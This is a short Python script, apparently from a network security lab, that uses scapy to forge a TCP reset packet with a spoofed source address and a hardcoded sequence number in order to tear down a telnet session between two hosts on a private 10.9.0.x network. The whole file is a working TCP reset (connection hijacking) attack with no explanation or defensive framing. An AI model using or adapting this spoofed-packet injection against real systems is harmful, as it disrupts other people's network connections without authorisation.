from scapy.all import IP, TCP, send
from ipaddress import IPv4Address  # Corrected import
import sys
print('sending rst packet')
IPLayer = IP(src='10.9.0.6',dst='10.9.0.7')
TCPLayer = TCP(sport=39624,dport=23,flags="R",seq=1297426908)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)
